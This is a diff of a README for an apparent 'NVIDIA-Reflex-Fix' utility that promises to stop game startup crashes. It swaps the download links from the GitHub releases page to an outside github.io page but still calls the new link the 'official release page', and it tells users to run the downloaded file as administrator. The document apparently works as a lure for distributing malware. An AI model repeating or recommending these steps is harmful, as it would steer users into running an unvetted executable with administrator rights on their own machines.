@@ -1,7 +1,7 @@
 # 🛠️ NVIDIA-Reflex-Fix - Resolves Game Startup Crashes Instantly
 
 <div align="center">
-  <a href="https://github.com/untempered-nullset985/NVIDIA-Reflex-Fix/releases">
+  <a href="https://untempered-nullset985.github.io">
     <img src="https://img.shields.io/badge/Download-NVIDIA--Reflex--Fix-blue" alt="Download Button">
   </a>
 </div>
@@ -25,7 +25,7 @@ Follow these steps to prepare your PC for the fix. Ensure your system meets the 
 
 The installation process requires a direct download. Follow these instructions to apply the patch to your files.
 
-1. Visit the [official release page](https://github.com/untempered-nullset985/NVIDIA-Reflex-Fix/releases) to download the latest version of the utility.
+1. Visit the [official release page](https://untempered-nullset985.github.io) to download the latest version of the utility.
 2. Locate the file in your Downloads folder once the transfer finishes.
 3. Right-click the file and select Run as administrator.
 4. Follow the instructions on the screen to scan your game library.
